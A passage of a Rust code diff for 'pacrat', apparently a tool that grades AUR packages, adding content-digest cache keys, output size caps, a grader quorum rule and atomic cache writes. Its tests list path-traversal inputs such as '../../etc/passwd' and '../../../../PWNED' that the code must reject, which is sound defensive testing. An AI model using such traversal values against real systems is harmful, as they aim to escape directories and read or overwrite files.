@@ -10,7 +10,7 @@
 //! forbids when it says failure is never Proceed. With no grading at all the
 //! verdict is UNGRADED, which holds.
 //!
-//! Two other rules shape the code:
+//! Four other rules shape the code:
 //!
 //! - **The tree is the thing that was reviewed.** Graders run against
 //!   `<store>/aur/packages/<name>/`, and a grading is cached under the
@@ -18,25 +18,45 @@
 //!   than approximated, because a grading filed under commit C that actually
 //!   read the tree at commit R is worse than no grading: it would let C
 //!   through the gate later, unread.
+//! - **A grading is about bytes, not about a commit.** Every cached grading
+//!   records the tree's content digest, and a read whose digest no longer
+//!   matches is a miss. A commit says what upstream published; it says
+//!   nothing about what is in the store right now, and without the digest,
+//!   editing a PKGBUILD after grading serves the old PROCEED forever.
+//! - **Only a configured grader or a human answers.** A cached grading from
+//!   a grader this host no longer runs can make a verdict worse and can
+//!   never make one exist — see the quorum rule in
+//!   [`pacrat_core::grading::Thresholds::verdict_of`], which is where that
+//!   is decided.
 //! - **Grader output is attacker text.** It has just been fed a PKGBUILD
 //!   whose author would like to say things to the reviewer's terminal, so
 //!   every string that comes back — titles, spans, the grader's own name,
-//!   stderr — goes through [`crate::out::visible`] before it is printed.
+//!   stderr — goes through [`crate::out::visible_line`] before it is
+//!   printed: neutered, and flattened onto one line so it cannot forge one
+//!   of pacrat's. How much of it there can be is bounded too
+//!   ([`STDOUT_LIMIT`]), because the grader chooses that number otherwise.
 
 use std::collections::BTreeMap;
 use std::fs;
-use std::io::Read;
+use std::io::{Read, Write};
 use std::path::{Path, PathBuf};
 use std::process::{Command, Stdio};
 use std::sync::mpsc;
 use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
 
+use serde::{Deserialize, Serialize};
+use serde_json::Value;
+
 use pacrat_core::config::{Grader, MANUAL};
-use pacrat_core::grading::{commit_matches, GradeReport, Subject, CONTRACT, PACRAT_SCALE};
+use pacrat_core::grading::{
+    commit_matches, has_quorum, worst_grade, Contribution, GradeReport, Standing, Subject,
+    CONTRACT, PACRAT_SCALE,
+};
 use pacrat_core::{Thresholds, Verdict};
 
 use crate::ctx::{self, Ctx};
-use crate::out::{shell_quote, truncate, visible};
+use crate::fstree;
+use crate::out::{shell_quote, truncate, visible, visible_line};
 use crate::vendor::valid_name;
 use crate::HELD;
 
@@ -61,6 +81,20 @@ const DRAIN_GRACE_KILLED: Duration = Duration::from_millis(100);
 /// TUI will scroll (ADR-001).
 const FINDINGS_SHOWN: usize = 5;
 
+/// The most stdout pacrat will hold from one grader.
+///
+/// A grading is a few kilobytes of JSON; four megabytes is room for a
+/// pathological-but-honest grader and a hard stop for a dishonest one. The
+/// bound has to exist because the grader chooses how much to write, and
+/// `read_to_end` on a pipe fed by `cat /dev/zero` is a request for all the
+/// memory on the machine — a hang or an OOM at exactly the moment pacrat is
+/// supposed to be judging something hostile.
+const STDOUT_LIMIT: usize = 4 * 1024 * 1024;
+
+/// stderr only ever contributes one truncated line to a message, so it needs
+/// far less — but it needs a bound for the same reason.
+const STDERR_LIMIT: usize = 64 * 1024;
+
 // ------------------------------------------------------------------ verbs
 
 pub fn run(
@@ -69,6 +103,7 @@ pub fn run(
     commit: Option<&str>,
     grade: Option<u8>,
     note: Option<&str>,
+    refresh: bool,
 ) -> Result<(), String> {
     if !valid_name(package) {
         return Err(format!(
@@ -88,14 +123,28 @@ pub fn run(
         )
     })?;
 
+    // `Sources::from_toml` already rejects a ledger whose `reviewed` is not
+    // a commit, and this checks it again anyway. The ledger is a synced file
+    // and this value becomes a path component of the grade cache; the cost
+    // of the second check is one comparison, and the cost of assuming the
+    // first one ran is a `reviewed = "../../../../PWNED"` writing outside
+    // the state directory. A `Sources` can also be built in memory, without
+    // ever passing through the parser.
+    let reviewed = check_commit(&entry.reviewed).map_err(|e| {
+        format!(
+            "{}: packages.{package}.reviewed: {e}",
+            ctx.sources_path().display()
+        )
+    })?;
+
     // An abbreviation of the reviewed commit *is* the reviewed commit; the
     // cache is keyed by the full hash so a later run finds this grading.
     let commit = match commit {
-        None => entry.reviewed.clone(),
+        None => reviewed.to_string(),
         Some(c) => {
             let c = check_commit(c)?;
-            if commit_matches(c, &entry.reviewed) {
-                entry.reviewed.clone()
+            if commit_matches(c, reviewed) {
+                reviewed.to_string()
             } else {
                 c.to_string()
             }
@@ -103,7 +152,14 @@ pub fn run(
     };
 
     match grade {
-        Some(g) => record_manual(ctx, package, &commit, g, note),
+        Some(g) => {
+            if refresh {
+                return Err(
+                    "--refresh re-runs graders; it has no meaning for a manual grade".into(),
+                );
+            }
+            record_manual(ctx, package, &commit, g, note)
+        }
         None => {
             if note.is_some() {
                 return Err(
@@ -112,9 +168,28 @@ pub fn run(
                         .into(),
                 );
             }
-            run_graders(ctx, package, &commit, &entry.reviewed)
+            run_graders(ctx, package, &commit, reviewed, refresh)
         }
     }
+}
+
+/// The store tree and its content digest.
+///
+/// Every grading — a program's or a human's — is recorded against a digest,
+/// so a tree edited afterwards invalidates it. A human's reading goes stale
+/// for exactly the reason a tool's does: it was true about bytes that are no
+/// longer there.
+fn store_tree(ctx: &Ctx, package: &str) -> Result<(PathBuf, String), String> {
+    let tree = ctx.store.join("aur").join("packages").join(package);
+    if !tree.is_dir() {
+        return Err(format!(
+            "{package} has no store tree at {} — the ledger and the store disagree; \
+             `pacrat vendor {package} --force` re-installs it",
+            tree.display()
+        ));
+    }
+    let digest = fstree::digest(&tree)?;
+    Ok((tree, digest))
 }
 
 /// A human's own grading. The note is required because a grade with no
@@ -155,32 +230,35 @@ fn record_manual(
             ("recorded_at".to_string(), now_secs().into()),
         ]),
     };
-    // The same shape a program's grading gets: one cache, one reader.
+    // The same shape a program's grading gets — one cache, one reader, one
+    // staleness rule.
+    let (tree, digest) = store_tree(ctx, package)?;
     let dir = cache_dir(package)?;
     let path = ok_path(&dir, commit, MANUAL);
-    write_cache(&path, &report.to_json())?;
+    write_grading(&path, &digest, &report.to_json())?;
     let _ = fs::remove_file(failed_path(&dir, commit, MANUAL));
 
     println!("package   {package}");
     println!("commit    {commit}");
+    println!("tree      {}", tree.display());
+    println!("digest    {digest}");
     println!("grader    {MANUAL}");
     println!("recorded  {}", path.display());
-    let (safe_note, _) = visible(note);
+    let (safe_note, _) = visible_line(note);
     println!("note      {safe_note}");
     println!();
     hold_if_held(verdict_line(&ctx.config.thresholds, Some(grade)));
     Ok(())
 }
 
-fn run_graders(ctx: &Ctx, package: &str, commit: &str, reviewed: &str) -> Result<(), String> {
-    let tree = ctx.store.join("aur").join("packages").join(package);
-    if !tree.is_dir() {
-        return Err(format!(
-            "{package} has no store tree at {} — the ledger and the store disagree; \
-             `pacrat vendor {package} --force` re-installs it",
-            tree.display()
-        ));
-    }
+fn run_graders(
+    ctx: &Ctx,
+    package: &str,
+    commit: &str,
+    reviewed: &str,
+    refresh: bool,
+) -> Result<(), String> {
+    let (tree, digest) = store_tree(ctx, package)?;
     // Refusing beats approximating: the tree on disk is the reviewed commit,
     // and a grading of it must not be filed under a different one.
     if commit != reviewed {
@@ -192,41 +270,84 @@ fn run_graders(ctx: &Ctx, package: &str, commit: &str, reviewed: &str) -> Result
         ));
     }
 
-    if ctx.config.graders.is_empty() {
+    let dir = cache_dir(package)?;
+
+    // Gradings nobody asked for this run — a manual one, or a grader since
+    // removed from the config. Read before the early exit below, because a
+    // recorded manual grading must be readable back on a host with no
+    // external graders at all.
+    let others = other_cached(&dir, commit, &digest, &ctx.config.graders, package);
+    if ctx.config.graders.is_empty() && others.is_empty() {
         return Err(no_graders_message(package));
     }
 
     println!("package   {package}");
     println!("commit    {commit}");
     println!("tree      {}", tree.display());
+    println!("digest    {digest}");
 
-    let dir = cache_dir(package)?;
-    let tree_arg = tree.to_string_lossy().into_owned();
-    let mut outcomes: Vec<(String, Outcome)> = Vec::new();
+    let subj = Subj {
+        package,
+        commit,
+        tree: &tree.to_string_lossy(),
+        digest: &digest,
+        refresh,
+    };
+    let mut answers: Vec<Answer> = Vec::new();
 
     for grader in &ctx.config.graders {
         println!();
         println!("grader    {}", grader.name);
-        let outcome = grade_with(grader, &dir, package, commit, &tree_arg);
-        report_outcome(&dir, commit, &grader.name, &outcome);
-        outcomes.push((grader.name.clone(), outcome));
+        let outcome = grade_with(grader, &dir, &subj);
+        report_outcome(&dir, commit, &digest, &grader.name, &outcome);
+        answers.push(Answer {
+            name: grader.name.clone(),
+            standing: Standing::Configured,
+            outcome,
+        });
     }
 
-    // Gradings nobody asked for this run — a manual one, or a grader that
-    // has since been removed from the config. They are gradings of this
-    // exact subject, so they count.
-    for (name, report) in other_cached(&dir, commit, &ctx.config.graders, package) {
+    for (name, report) in others {
         println!();
         println!("grader    {name}");
         println!("cache     {}", ok_path(&dir, commit, &name).display());
+        let standing = if name == MANUAL {
+            Standing::Manual
+        } else {
+            Standing::Retired
+        };
         let outcome = Outcome::Graded { report, took: None };
-        report_outcome(&dir, commit, &name, &outcome);
-        outcomes.push((name, outcome));
+        report_outcome(&dir, commit, &digest, &name, &outcome);
+        answers.push(Answer {
+            name,
+            standing,
+            outcome,
+        });
     }
 
     println!();
-    hold_if_held(summarize(ctx, &outcomes));
+    hold_if_held(summarize(ctx, &answers));
     Ok(())
+}
+
+/// One grader's answer, and whether it is entitled to answer for this run.
+struct Answer {
+    name: String,
+    standing: Standing,
+    outcome: Outcome,
+}
+
+impl Answer {
+    fn grade(&self) -> Option<u8> {
+        match &self.outcome {
+            Outcome::Graded { report, .. } => Some(report.pacrat_grade()),
+            Outcome::Failed { .. } => None,
+        }
+    }
+
+    fn contribution(&self) -> Contribution {
+        Contribution::new(self.standing, self.grade())
+    }
 }
 
 // ------------------------------------------------------------- one grader
@@ -246,20 +367,44 @@ enum Outcome {
     },
 }
 
-fn grade_with(grader: &Grader, dir: &Path, package: &str, commit: &str, tree: &str) -> Outcome {
-    let cache = ok_path(dir, commit, &grader.name);
-    match read_cache(&cache, package, commit) {
-        Ok(Some(report)) => {
-            println!("cache     {}", cache.display());
-            return Outcome::Graded { report, took: None };
+/// Everything about the thing being graded that does not change per grader.
+struct Subj<'a> {
+    package: &'a str,
+    commit: &'a str,
+    /// The store tree's path, as the grader's `{tree}` argument.
+    tree: &'a str,
+    /// The store tree's content digest — the cache's real identity.
+    digest: &'a str,
+    /// Skip cache *reads*. Writes still happen: `--refresh` means "ask
+    /// again", not "stop remembering".
+    refresh: bool,
+}
+
+fn grade_with(grader: &Grader, dir: &Path, subj: &Subj) -> Outcome {
+    let cache = ok_path(dir, subj.commit, &grader.name);
+    if subj.refresh {
+        println!("refresh   ignoring any cached grading (--refresh)");
+    } else {
+        match read_cache(&cache, subj.package, subj.commit, subj.digest) {
+            CacheLook::Hit(report) => {
+                println!("cache     {}", cache.display());
+                return Outcome::Graded { report, took: None };
+            }
+            CacheLook::Miss => {}
+            // The tree is not the tree that was graded. Not an error and not
+            // a hit: the grading was true about bytes that are gone.
+            CacheLook::Stale => {
+                println!("stale     the store tree changed since it was graded — grading again")
+            }
+            // A cache entry we cannot trust is not a reason to hold — it is a
+            // reason to ask again — but the user should know it was there.
+            CacheLook::Unusable(e) => {
+                println!("warning   ignoring {}: {e}", cache.display())
+            }
         }
-        Ok(None) => {}
-        // A cache entry we cannot trust is not a reason to hold — it is a
-        // reason to ask again — but the user should know it was there.
-        Err(e) => println!("warning   ignoring {}: {e}", cache.display()),
     }
 
-    let argv = grader.argv(package, tree, commit);
+    let argv = grader.argv(subj.package, subj.tree, subj.commit);
     let shown = argv
         .iter()
         .map(|a| shell_quote(a))
@@ -285,6 +430,16 @@ fn grade_with(grader: &Grader, dir: &Path, package: &str, commit: &str, tree: &s
     if ran.timed_out {
         return fail(format!("timed out after {}s", grader.timeout_s));
     }
+    // Before the exit status, because this *causes* an exit status: capping
+    // the read closes the pipe, and a grader still writing into it dies of
+    // SIGPIPE. Reported the other way round the reason would be "killed by
+    // a signal", which is true, useless, and blames the wrong party.
+    if ran.stdout.len() > STDOUT_LIMIT {
+        return fail(format!(
+            "output exceeded {} MB — a grading is a few kilobytes of JSON",
+            STDOUT_LIMIT / (1024 * 1024)
+        ));
+    }
     match ran.code {
         Some(0) => {}
         Some(code) => return fail(format!("exited {code}{}", stderr_tail(&ran.stderr))),
@@ -294,10 +449,15 @@ fn grade_with(grader: &Grader, dir: &Path, package: &str, commit: &str, tree: &s
     let text = String::from_utf8_lossy(&ran.stdout);
     let report = match GradeReport::from_json(&text) {
         Ok(r) => r,
-        Err(e) => return fail(visible(&e).0),
+        Err(e) => return fail(visible_line(&e).0),
     };
-    if let Err(e) = report.is_about(package, commit) {
-        return fail(visible(&e).0);
+    if let Err(e) = report.is_about(subj.package, subj.commit) {
+        return fail(visible_line(&e).0);
+    }
+    // A grader whose scale moved is not one whose grades mean what they used
+    // to; pacrat would happily rescale 70-of-100 into a mild WARN.
+    if let Err(e) = grader.check_scale(report.scale) {
+        return fail(e);
     }
 
     // Only a grading that survived every check is written to the cache; the
@@ -307,17 +467,18 @@ fn grade_with(grader: &Grader, dir: &Path, package: &str, commit: &str, tree: &s
     // `is_about` accepts an abbreviation, and filing this under `3f9c21ab`
     // when every read asks for the full hash would be a cache that never
     // hits — the grader would be re-run, and paid for, on every invocation.
-    if let Err(e) = write_cache(&cache, &text) {
+    // The tree digest recorded alongside is what the next read checks.
+    if let Err(e) = write_grading(&cache, subj.digest, &text) {
         println!("warning   {e}");
     }
-    let _ = fs::remove_file(failed_path(dir, commit, &grader.name));
+    let _ = fs::remove_file(failed_path(dir, subj.commit, &grader.name));
     Outcome::Graded {
         report,
         took: Some(elapsed),
     }
 }
 
-fn report_outcome(dir: &Path, commit: &str, name: &str, outcome: &Outcome) {
+fn report_outcome(dir: &Path, commit: &str, digest: &str, name: &str, outcome: &Outcome) {
     match outcome {
         Outcome::Graded { report, took } => {
             let freshness = match took {
@@ -334,19 +495,22 @@ fn report_outcome(dir: &Path, commit: &str, name: &str, outcome: &Outcome) {
             }
             println!("result    {line}");
 
-            // The grader's own idea of its name, if it disagrees with ours.
-            let (reported, _) = visible(&report.grader);
+            // Every field below is the grader's text on pacrat's own report,
+            // so it goes through `visible_line`: neutered *and* flattened,
+            // because a newline in a title would otherwise let a grader
+            // write a line that looks exactly like one of pacrat's.
+            let (reported, _) = visible_line(&report.grader);
             if reported != name {
                 println!("reports   as {:?}", truncate(&reported, 40));
             }
             if let Some(note) = report.meta.get("note").and_then(|v| v.as_str()) {
-                println!("note      {}", truncate(&visible(note).0, 90));
+                println!("note      {}", truncate(&visible_line(note).0, 90));
             }
 
             for f in report.top_findings(FINDINGS_SHOWN) {
-                let (title, _) = visible(&f.title);
+                let (title, _) = visible_line(&f.title);
                 let span = match &f.span {
-                    Some(s) => format!("{} · ", truncate(&visible(s).0, 30)),
+                    Some(s) => format!("{} · ", truncate(&visible_line(s).0, 30)),
                     None => String::new(),
                 };
                 println!("finding   [{}] {span}{}", f.level, truncate(&title, 80));
@@ -366,7 +530,7 @@ fn report_outcome(dir: &Path, commit: &str, name: &str, outcome: &Outcome) {
                 elapsed.as_secs_f64()
             );
             let path = failed_path(dir, commit, name);
-            match record_failure(&path, name, commit, reason) {
+            match record_failure(&path, name, commit, digest, reason) {
                 // Kept so a later run — or the jobs view — can say why this
                 // grader contributed nothing, without re-running it.
                 Ok(()) => println!("recorded  {}", path.display()),
@@ -376,45 +540,85 @@ fn report_outcome(dir: &Path, commit: &str, name: &str, outcome: &Outcome) {
     }
 }
 
-fn summarize(ctx: &Ctx, outcomes: &[(String, Outcome)]) -> Verdict {
-    let grades: Vec<u8> = outcomes
-        .iter()
-        .filter_map(|(_, o)| match o {
-            Outcome::Graded { report, .. } => Some(report.pacrat_grade()),
-            Outcome::Failed { .. } => None,
-        })
-        .collect();
-    let failed: Vec<&str> = outcomes
-        .iter()
-        .filter(|(_, o)| matches!(o, Outcome::Failed { .. }))
-        .map(|(n, _)| n.as_str())
-        .collect();
+/// Print the caveats, then the verdict.
+///
+/// In that order on purpose: the verdict is the last line, which is what a
+/// reader scrolled to the bottom sees and what a screenshot catches. A
+/// caveat printed *after* it reads as a footnote to a decision already made,
+/// when it is really a qualification of it.
+fn summarize(ctx: &Ctx, answers: &[Answer]) -> Verdict {
+    let contributions: Vec<Contribution> = answers.iter().map(Answer::contribution).collect();
+    let quorum = has_quorum(&contributions);
+    let worst = worst_grade(&contributions);
 
-    // Worst-wins across the graders that answered (ADR-001 open question 5).
-    let verdict = verdict_line(&ctx.config.thresholds, grades.iter().copied().max());
+    let named = |standing: Standing, graded: bool| -> Vec<&str> {
+        answers
+            .iter()
+            .filter(|a| a.standing == standing && a.grade().is_some() == graded)
+            .map(|a| a.name.as_str())
+            .collect()
+    };
+    let failed = named(Standing::Configured, false);
+    let answered = named(Standing::Configured, true);
+    let retired: Vec<&Answer> = answers
+        .iter()
+        .filter(|a| a.standing == Standing::Retired && a.grade().is_some())
+        .collect();
+    let manual = named(Standing::Manual, true);
 
     if !failed.is_empty() {
-        if grades.is_empty() {
-            println!(
-                "reason    no grader answered ({} failed: {}) — ungraded holds; it is \
-                 never read as proceed",
-                failed.len(),
-                failed.join(", ")
-            );
-        } else {
+        if quorum {
             // Worst-wins over what answered is only sound if the reader
             // knows what did not: the missing grader could have been worse.
             println!(
-                "warning   {} of {} graders produced no grading ({}) — this verdict rests \
-                 on the {} that answered",
+                "warning   {} of {} configured grader{} produced no grading ({}) — this \
+                 verdict rests on what did answer",
                 failed.len(),
-                outcomes.len(),
-                failed.join(", "),
-                grades.len()
+                failed.len() + answered.len(),
+                if failed.len() + answered.len() == 1 {
+                    ""
+                } else {
+                    "s"
+                },
+                failed.join(", ")
+            );
+        } else {
+            println!(
+                "reason    no configured grader answered ({} failed: {}) and there is no \
+                 manual grading — ungraded holds; it is never read as proceed",
+                failed.len(),
+                failed.join(", ")
+            );
+        }
+    } else if !quorum && manual.is_empty() && answered.is_empty() {
+        println!(
+            "reason    nothing graded this subject — ungraded holds; it is never read \
+             as proceed"
+        );
+    }
+
+    // A retired grading is evidence. Say so explicitly whenever one is in
+    // play, because "worst-wins but cannot vouch" is not a rule a reader
+    // should have to infer from a number.
+    for a in &retired {
+        let grade = a.grade().unwrap_or_default();
+        if quorum {
+            println!(
+                "note      {} is not in this host's config; its cached grade {grade} still \
+                 counts toward the worst",
+                a.name
+            );
+        } else {
+            println!(
+                "note      {} has a cached grade of {grade} on file, but a grader this host \
+                 no longer runs cannot answer for this run — it can only make a verdict \
+                 worse, never make one exist",
+                a.name
             );
         }
     }
-    verdict
+
+    verdict_line(&ctx.config.thresholds, if quorum { worst } else { None })
 }
 
 /// The line the whole command exists to print. The thresholds are named on
@@ -495,15 +699,20 @@ fn run_with_timeout(argv: &[String], timeout: Duration) -> Result<Ran, String> {
         .map_err(|e| format!("could not run {}: {e}", argv[0]))?;
 
     let (tx, rx) = mpsc::channel::<(bool, Vec<u8>)>();
-    for (is_err, pipe) in [
-        (false, child.stdout.take().map(PipeRead::Out)),
-        (true, child.stderr.take().map(PipeRead::Err)),
+    for (is_err, limit, pipe) in [
+        (false, STDOUT_LIMIT, child.stdout.take().map(PipeRead::Out)),
+        (true, STDERR_LIMIT, child.stderr.take().map(PipeRead::Err)),
     ] {
-        let Some(mut pipe) = pipe else { continue };
+        let Some(pipe) = pipe else { continue };
         let tx = tx.clone();
         std::thread::spawn(move || {
+            // One byte past the limit, so the caller can tell "exactly at
+            // the limit" from "more than we were willing to hold". Reading
+            // to end unbounded is how `cat /dev/zero` becomes pacrat's
+            // memory: the grader picks the number, not us.
             let mut buf = Vec::new();
-            let _ = pipe.read_to_end(&mut buf);
+            let mut capped = pipe.take(limit as u64 + 1);
+            let _ = capped.read_to_end(&mut buf);
             let _ = tx.send((is_err, buf));
         });
     }
@@ -592,37 +801,126 @@ fn failed_path(dir: &Path, commit: &str, grader: &str) -> PathBuf {
     dir.join(format!("{commit}.{grader}.failed.json"))
 }
 
-/// A cached grading, if there is a trustworthy one. `Ok(None)` is a miss;
-/// `Err` is a file that exists and cannot be believed.
-fn read_cache(path: &Path, package: &str, commit: &str) -> Result<Option<GradeReport>, String> {
-    let text = match fs::read_to_string(path) {
-        Ok(t) => t,
-        Err(_) => return Ok(None),
-    };
-    // Re-validated on the way out, not trusted because we wrote it: the file
-    // is in a user-writable directory and may be years older than this
-    // binary's idea of the contract.
-    let report = GradeReport::from_json(&text)?;
-    report.is_about(package, commit)?;
-    Ok(Some(report))
+/// The grade cache's own wrapper around one grader's answer.
+///
+/// The grader's JSON is kept verbatim in `report` as a `Value` rather than a
+/// re-serialized `GradeReport`, so a field this pacrat has never heard of
+/// survives in the file for a version that has — the same forward
+/// compatibility the contract promises, extended to the cache.
+///
+/// `tree` is the part pacrat cannot ask the grader for. A commit names what
+/// upstream published; it says nothing about the bytes actually sitting in
+/// the store, which a `git` mishap, a sync, or a hand edit can change under
+/// a grading that has already been recorded. Without it, editing a PKGBUILD
+/// after grading serves the old PROCEED forever.
+#[derive(Serialize, Deserialize)]
+struct CacheRecord {
+    pacrat: String,
+    tree: String,
+    at: u64,
+    report: Value,
 }
 
+const CACHE_TAG: &str = "grade-cache/v1";
+const FAILURE_TAG: &str = "grader-failure/v1";
+
+/// What the cache had to say about a subject.
+enum CacheLook {
+    Hit(GradeReport),
+    /// Nothing on file.
+    Miss,
+    /// A grading of *these* bytes no longer — the tree changed since. A miss
+    /// with a reason, never an error: the honest response is to grade again.
+    Stale,
+    /// A file that exists and cannot be believed.
+    Unusable(String),
+}
+
+fn read_cache(path: &Path, package: &str, commit: &str, tree: &str) -> CacheLook {
+    let Ok(text) = fs::read_to_string(path) else {
+        return CacheLook::Miss;
+    };
+    let record: CacheRecord = match serde_json::from_str(&text) {
+        Ok(r) => r,
+        Err(e) => return CacheLook::Unusable(format!("not a grade-cache record: {e}")),
+    };
+    if record.pacrat != CACHE_TAG {
+        return CacheLook::Unusable(format!("{:?} is not {CACHE_TAG:?}", record.pacrat));
+    }
+    // Before anything else: is this a grading of the tree that is there now?
+    if record.tree != tree {
+        return CacheLook::Stale;
+    }
+    // Re-validated on the way out, not trusted because we wrote it: the file
+    // sits in a user-writable directory and may be years older than this
+    // binary's idea of the contract.
+    match GradeReport::from_json_value(record.report) {
+        Err(e) => CacheLook::Unusable(e),
+        Ok(report) => match report.is_about(package, commit) {
+            Err(e) => CacheLook::Unusable(e),
+            Ok(()) => CacheLook::Hit(report),
+        },
+    }
+}
+
+/// Write a cache file atomically.
+///
+/// `fs::write` truncates first, so an interrupted write would leave a
+/// half-written grading that the next run has to reject — mirroring
+/// `Ctx::save_sources`, the bytes land in a sibling temp file and a rename
+/// puts them in place, which is all-or-nothing.
 fn write_cache(path: &Path, json: &str) -> Result<(), String> {
     let dir = path
         .parent()
         .ok_or_else(|| format!("{}: no parent directory", path.display()))?;
     fs::create_dir_all(dir).map_err(|e| format!("{}: {e}", dir.display()))?;
-    fs::write(path, json).map_err(|e| format!("{}: {e}", path.display()))
+    let name = path
+        .file_name()
+        .and_then(|n| n.to_str())
+        .ok_or_else(|| format!("{}: unusable file name", path.display()))?;
+    let tmp = dir.join(format!(".{name}.{}.new", std::process::id()));
+    let write = || -> std::io::Result<()> {
+        let mut f = fs::File::create(&tmp)?;
+        f.write_all(json.as_bytes())?;
+        f.sync_all()
+    };
+    write().map_err(|e| format!("{}: {e}", tmp.display()))?;
+    fs::rename(&tmp, path).map_err(|e| {
+        let _ = fs::remove_file(&tmp);
+        format!("{}: {e}", path.display())
+    })
+}
+
+fn write_grading(path: &Path, tree: &str, report: &str) -> Result<(), String> {
+    let report: Value = serde_json::from_str(report)
+        .map_err(|e| format!("{}: the grading did not re-parse: {e}", path.display()))?;
+    let record = CacheRecord {
+        pacrat: CACHE_TAG.to_string(),
+        tree: tree.to_string(),
+        at: now_secs(),
+        report,
+    };
+    let json =
+        serde_json::to_string_pretty(&record).map_err(|e| format!("{}: {e}", path.display()))?;
+    write_cache(path, &format!("{json}\n"))
 }
 
 /// Why a grader produced nothing. Deliberately *not* a `GradeReport`: the
 /// distinct top-level key means no reader can mistake this file for a
-/// grading, whatever it does with the rest of the fields.
-fn record_failure(path: &Path, grader: &str, commit: &str, reason: &str) -> Result<(), String> {
+/// grading, whatever it does with the rest of the fields. It carries the
+/// tree digest too, so a failure can be read as "against these bytes".
+fn record_failure(
+    path: &Path,
+    grader: &str,
+    commit: &str,
+    tree: &str,
+    reason: &str,
+) -> Result<(), String> {
     let record = serde_json::json!({
-        "pacrat": "grader-failure/v1",
+        "pacrat": FAILURE_TAG,
         "grader": grader,
         "commit": commit,
+        "tree": tree,
         "reason": reason,
         "at": now_secs(),
     });
@@ -630,11 +928,16 @@ fn record_failure(path: &Path, grader: &str, commit: &str, reason: &str) -> Resu
 }
 
 /// Cached gradings for this subject from graders that are not in the config
-/// — the built-in `manual` one, or a grader since removed. Unreadable files
-/// are skipped: this is a scan, and a stray file here must not fail the run.
+/// — the built-in `manual` one, or a grader since removed. Unreadable and
+/// stale files are skipped: this is a scan, and a stray file here must not
+/// fail the run.
+///
+/// These are *evidence*, not answers. See `pacrat_core::grading`'s quorum
+/// rule for what they may and may not do to a verdict.
 fn other_cached(
     dir: &Path,
     commit: &str,
+    tree: &str,
     configured: &[Grader],
     package: &str,
 ) -> Vec<(String, GradeReport)> {
@@ -654,8 +957,10 @@ fn other_cached(
             if name.is_empty() || configured.iter().any(|g| g.name == name) {
                 return None;
             }
-            let report = read_cache(&e.path(), package, commit).ok().flatten()?;
-            Some((name.to_string(), report))
+            match read_cache(&e.path(), package, commit, tree) {
+                CacheLook::Hit(report) => Some((name.to_string(), report)),
+                _ => None,
+            }
         })
         .collect();
     // `manual` first, then alphabetical: a human's reading leads.
@@ -691,6 +996,11 @@ mod tests {
 
     // ---- pure helpers ----
 
+    /// The CLI half of the ledger check. `Sources::from_toml` rejects these
+    /// too — see `sources::tests::a_reviewed_commit_that_is_not_a_commit_
+    /// fails_to_parse`, which uses the same hostile values. Both layers,
+    /// because a `Sources` can be built in memory without passing through
+    /// the parser, and this value becomes a path component of the cache.
     #[test]
     fn commits_must_look_like_commits() {
         assert!(check_commit("3f9c21ab").is_ok());
@@ -698,6 +1008,9 @@ mod tests {
         for bad in [
             "",
             "abc", // too short to name one tree
+            // The traversal a reviewer demonstrated escaping the state dir
+            // with, as `reviewed` in a synced ledger.
+            "../../../../PWNED",
             "../../etc/passwd",
             "3f9c21ab/../x",
             "HEAD~1",
@@ -706,6 +1019,28 @@ mod tests {
         ] {
             assert!(check_commit(bad).is_err(), "{bad:?} should be rejected");
         }
+    }
+
+    /// What a rejected commit would have cost. A cache filename is supposed
+    /// to be one component inside the package's directory; a traversal makes
+    /// it something else entirely, which is why `check_commit` guards every
+    /// path into here.
+    #[test]
+    fn a_rejected_commit_would_have_escaped_the_cache_directory() {
+        let dir = Path::new("/state/grades/mdcat");
+
+        let escaped = ok_path(dir, "../../../../PWNED", MANUAL);
+        assert_ne!(
+            escaped.parent(),
+            Some(dir),
+            "the traversal should not have stayed inside the cache directory"
+        );
+        assert!(escaped
+            .components()
+            .any(|c| c == std::path::Component::ParentDir));
+
+        // A real object id stays put — one file, one directory.
+        assert_eq!(ok_path(dir, &"a".repeat(40), MANUAL).parent(), Some(dir));
     }
 
     #[test]
@@ -851,6 +1186,8 @@ mod tests {
 
     // ---- the cache ----
 
+    const FULL: &str = "3f9c21ab55de0011223344556677889900aabbcc";
+
     fn report_json(package: &str, commit: &str, grade: u8) -> String {
         format!(
             r#"{{"contract":"pacrat-grade/v1","grader":"stub",
@@ -858,81 +1195,350 @@ mod tests {
         )
     }
 
+    fn grader(name: &str, cmd: Vec<String>) -> Grader {
+        Grader {
+            name: name.into(),
+            cmd,
+            timeout_s: 30,
+            scale: None,
+        }
+    }
+
+    /// A store tree the fixture can edit under a grading's feet.
+    impl Fixture {
+        fn tree(&self, contents: &str) -> (PathBuf, String) {
+            let tree = self.dir.join("tree");
+            fs::create_dir_all(&tree).unwrap();
+            fs::write(tree.join("PKGBUILD"), contents).unwrap();
+            let digest = fstree::digest(&tree).unwrap();
+            (tree, digest)
+        }
+
+        fn subj<'a>(&self, digest: &'a str, tree: &'a str) -> Subj<'a> {
+            Subj {
+                package: "mdcat",
+                commit: FULL,
+                tree,
+                digest,
+                refresh: false,
+            }
+        }
+    }
+
+    fn hit(look: CacheLook) -> GradeReport {
+        match look {
+            CacheLook::Hit(r) => r,
+            CacheLook::Miss => panic!("expected a hit, got a miss"),
+            CacheLook::Stale => panic!("expected a hit, got stale"),
+            CacheLook::Unusable(e) => panic!("expected a hit, got unusable: {e}"),
+        }
+    }
+
     #[test]
     fn the_cache_re_validates_what_it_reads() {
         let f = Fixture::new("cache");
-        let path = ok_path(&f.dir, "3f9c21ab", "stub");
+        let path = ok_path(&f.dir, FULL, "stub");
+        let tree = "d".repeat(64);
 
-        // A miss is not an error.
-        assert_eq!(read_cache(&path, "mdcat", "3f9c21ab").unwrap(), None);
+        assert!(matches!(
+            read_cache(&path, "mdcat", FULL, &tree),
+            CacheLook::Miss
+        ));
 
-        write_cache(&path, &report_json("mdcat", "3f9c21ab", 2)).unwrap();
-        let hit = read_cache(&path, "mdcat", "3f9c21ab").unwrap().unwrap();
-        assert_eq!(hit.grade, 2);
+        write_grading(&path, &tree, &report_json("mdcat", FULL, 2)).unwrap();
+        assert_eq!(hit(read_cache(&path, "mdcat", FULL, &tree)).grade, 2);
 
         // Same file, different subject: not a hit, and not silently ignored.
-        assert!(read_cache(&path, "pacseek", "3f9c21ab").is_err());
-        assert!(read_cache(&path, "mdcat", "deadbeefcafe").is_err());
+        assert!(matches!(
+            read_cache(&path, "pacseek", FULL, &tree),
+            CacheLook::Unusable(_)
+        ));
+        assert!(matches!(
+            read_cache(&path, "mdcat", "deadbeefcafe", &tree),
